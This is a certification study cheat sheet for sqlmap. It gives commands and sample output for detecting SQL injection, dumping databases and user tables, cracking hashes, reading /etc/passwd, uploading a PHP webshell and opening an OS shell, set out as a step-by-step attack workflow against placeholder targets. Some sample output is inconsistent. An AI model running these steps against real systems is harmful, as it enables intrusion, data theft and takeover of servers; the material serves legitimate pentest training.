SQLMAP - SQL Injection Automation

Overview

sqlmap is an automated tool for detecting and exploiting SQL injection vulnerabilities. It automatically tests parameters for SQL injection, identifies databases, and can extract data or execute commands.

Why It's Critical for eJPT:

  • SQL injection is extremely common in web apps
  • Automates tedious manual testing
  • Can extract entire databases
  • Can read/write files on server
  • Can execute system commands (in some cases)
  • Works with GET, POST, COOKIE, HEADER parameters

Installation & Setup

CachyOS (Arch Linux)

sudo pacman -S sqlmap
sqlmap --version  # Verify
which sqlmap

Windows

  • Download from: https://github.com/sqlmapproject/sqlmap
  • Requires Python (usually included)
  • Run: python sqlmap.py

Core Concepts

SQL Injection Types

  • Boolean-based blind: True/False responses
  • Time-based blind: Response time differences
  • Error-based: Database error messages reveal data
  • UNION-based: Attach UNION SELECT statements
  • Stacked queries: Execute multiple queries

Parameter Types

  • GET: URL parameters (?id=1)
  • POST: Form data
  • COOKIE: Session cookies
  • HEADER: Custom headers

Database Targets

  • MySQL / MariaDB
  • PostgreSQL
  • MSSQL
  • SQLite
  • Oracle
  • Others...

Common Use Cases

1. Basic URL Testing

sqlmap -u "http://target.com/page?id=1"

Flags: - -u: Target URL

Output:

[*] Testing GET parameter 'id'
[CRITICAL] parameter 'id' appears to be vulnerable to SQL injection attacks

[*] Attempting break-out from quoted context
[*] Trying UNION SELECT injection

[+] Parameter: id (GET)
    Type: UNION query-based
    Title: Generic UNION query SQL injection
    Payload: 1' UNION SELECT NULL,NULL,NULL--

[*] Fetched data:
[*] Database: wordpress
[*] User: root@localhost

2. List Databases

sqlmap -u "http://target.com/page?id=1" --dbs

Output:

available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] wordpress

3. List Tables in Database

sqlmap -u "http://target.com/page?id=1" -D wordpress --tables

Flags: - -D: Database name - --tables: List tables

Output:

Database: wordpress
[15 tables]
+------------------+
| wp_commentmeta   |
| wp_comments      |
| wp_links         |
| wp_options       |
| wp_postmeta      |
| wp_posts         |
| wp_term_taxonomy |
| wp_terms         |
| wp_users         |
+------------------+

4. Dump Specific Table

sqlmap -u "http://target.com/page?id=1" -D wordpress -T wp_users --dump

Flags: - -T: Table name - --dump: Extract data

Output:

Database: wordpress
Table: wp_users
[2 entries]
+----+----------+------+-------+
| ID | user_login | user_pass | user_email |
+----+----------+------+-------+
| 1  | admin    | [hash] | admin@site.com |
| 2  | user1    | [hash] | user1@site.com |
+----+----------+------+-------+

5. Crack Password Hashes

sqlmap -u "http://target.com/page?id=1" -D wordpress -T wp_users \
  --dump --threads 5 --passwords

6. POST Parameter Testing

sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

Flags: - --data: POST data to test

7. Cookie Testing

sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123; user=1"

8. Test Specific Parameter

sqlmap -u "http://target.com/search?q=test&page=1" -p "q"

Flags: - -p: Specify parameter to test

9. Read Files

sqlmap -u "http://target.com/page?id=1" --file-read=/etc/passwd

Output:

[*] Reading /etc/passwd file:
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...

10. Write Files (Webshell)

sqlmap -u "http://target.com/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

11. Execute OS Commands

sqlmap -u "http://target.com/page?id=1" -x "whoami"
sqlmap -u "http://target.com/page?id=1" --os-shell

12. Authentication

sqlmap -u "http://target.com/admin?id=1" \
  --auth-type=Basic --auth-cred="admin:password"

13. Proxy Through Burp

sqlmap -u "http://target.com/page?id=1" \
  --proxy="http://127.0.0.1:8080"

14. Use Saved Burp Request

sqlmap -r request.txt

Flags: - -r: Read HTTP request from file

15. Risk & Level

sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5

Flags: - --risk: 1-3 (conservative to aggressive) - --level: 1-5 (basic to thorough)

Practical eJPT Workflow

Complete SQL Injection Exploitation

# Step 1: Identify vulnerable parameter
sqlmap -u "http://target.com/product?id=1" -v 1

# Step 2: If vulnerable, list databases
sqlmap -u "http://target.com/product?id=1" --dbs

# Step 3: List tables in target database
sqlmap -u "http://target.com/product?id=1" -D target_db --tables

# Step 4: Dump tables with data
sqlmap -u "http://target.com/product?id=1" -D target_db -T users --dump

# Step 5: Crack password hashes
sqlmap -u "http://target.com/product?id=1" -D target_db -T users \
  --dump --passwords

# Step 6: Try file read
sqlmap -u "http://target.com/product?id=1" --file-read=/etc/passwd

# Step 7: Try webshell upload
sqlmap -u "http://target.com/product?id=1" \
  --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php

# Step 8: Access shell
curl http://target.com/shell.php?cmd=id

Real-World Example

# Scenario: eJPT lab with vulnerable search page

$ nmap -p 80 192.168.1.50 -sV
# Result: Apache 2.4.6 on port 80

$ firefox http://192.168.1.50
# Find search form with parameter: ?search=test

$ sqlmap -u "http://192.168.1.50/search?search=test" --dbs
[*] Testing GET parameter 'search'
[+] Vulnerable to SQL injection!

$ sqlmap -u "http://192.168.1.50/search?search=test" -D mysql --tables
# Shows: user, password_history, etc.

$ sqlmap -u "http://192.168.1.50/search?search=test" -D mysql -T user --dump
# Extracts admin:password_hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# Cracks password to: "password123"

# Now use credentials to login or escalate

Command Reference

Flag Purpose Example
-u Target URL -u "http://target.com/page?id=1"
--dbs List databases Enumerate available databases
-D Database -D wordpress
--tables List tables Show tables in database
-T Table -T wp_users
--dump Extract data Dump table contents
--data POST data --data="user=admin&pass=pass"
-p Parameter -p "id" (specific parameter)
--file-read Read file --file-read=/etc/passwd
--file-write Write file --file-write=shell.php
-x Execute command -x "whoami"
--os-shell Interactive shell Spawn command shell
--risk Aggressiveness 1-3 (default 1)
--level Depth 1-5 (default 1)
-r From file -r request.txt
-v Verbosity -v 0-6 (default 1)

Tips & Tricks

Quick Exploitation

# Start basic:
sqlmap -u "http://target.com?id=1" -v 1

# If not found, increase level/risk:
sqlmap -u "http://target.com?id=1" --level=5 --risk=3

# If still not found, try different technique:
sqlmap -u "http://target.com?id=1" --technique=T  # Time-based

# Get everything from database:
sqlmap -u "http://target.com?id=1" --dump-all

# Try blind injection on POST:
sqlmap -u "http://target.com/login" --data="u=admin&p=pass" --level=5

Performance

# Fast (basic tests):
sqlmap -u "http://target.com?id=1" --level=1

# Thorough (takes longer):
sqlmap -u "http://target.com?id=1" --level=5 --risk=3

# Very fast (risky):
sqlmap -u "http://target.com?id=1" --technique=E  # Error-based only

Common Findings

Finding Implication Action
Vulnerable parameter Direct database access Dump all data
No database access Limited exploitation Read files / RCE
File read works Read configs Look for credentials/paths
File write works RCE possible Upload webshell
User table found Credentials available Crack hashes

Combining Tools

sqlmap → john (Password Cracking)

# Extract hashes:
sqlmap -u "http://target.com?id=1" -D mysql -T user --dump > hashes.txt

# Crack with john:
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Gobuster → sqlmap (Workflow)

# Find pages with gobuster:
gobuster dir -u http://target.com -w wordlist.txt

# Test each for SQL injection with sqlmap:
sqlmap -u "http://target.com/page1?id=1"
sqlmap -u "http://target.com/page2?id=1"
sqlmap -u "http://target.com/admin?id=1"

Burp Suite → sqlmap

# Intercept request in Burp
# Copy request to file
# Test with sqlmap:
sqlmap -r request.txt --dbs

Troubleshooting

Problem Solution
"No parameter to test" Specify with -p or use --data
"Target URL seems down" Check connectivity with curl first
"No injectable parameter" Not all parameters are vulnerable
"False positive" Use -p to test specific parameter only
"Timeout" Use --timeout=30 or reduce --threads

Key Takeaways

  1. Basic test: sqlmap -u "http://target?id=1"
  2. Extract databases: --dbs
  3. Extract tables: -D db --tables
  4. Extract data: -D db -T table --dump
  5. Crack hashes: --passwords or use john
  6. Read files: --file-read=/path/file
  7. Write shells: --file-write=shell.php
  8. Execute commands: --os-shell
  9. Adjust testing: --level=5 --risk=3 for thorough
  10. Combine with other tools: Gobuster finds pages, sqlmap tests them

Next Steps: Use extracted data and credentials for privilege escalation or lateral movement.
